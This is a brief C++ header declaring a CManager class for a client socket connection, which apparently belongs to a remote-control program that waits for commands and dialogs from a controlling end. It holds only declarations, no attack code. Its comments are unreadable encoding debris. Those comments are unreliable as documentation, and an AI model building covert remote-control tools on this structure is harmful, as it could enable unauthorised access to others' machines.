#pragma once
#include <stdio.h>
#include "ClientSocket.h"

class CManager     //������һ������ ʵ�����麯��
{

public:
	friend class CClientSocket;                   //���ﲻ�ӱ���
	CManager(CClientSocket *pClient);
	virtual ~CManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	int CManager::Send(LPBYTE lpData, UINT nSize);
	CClientSocket	*m_pClient;


	HANDLE	m_hEventDlgOpen;    //�ȴ������ƶ˴򿪴���  �������ƶ˷�����COMMAND_NEXT ��Ϣ�� ���Ǿͻ����NotifyDialogIsOpen ���������¼�����
	void WaitForDialogOpen();
	void NotifyDialogIsOpen();

private:
};

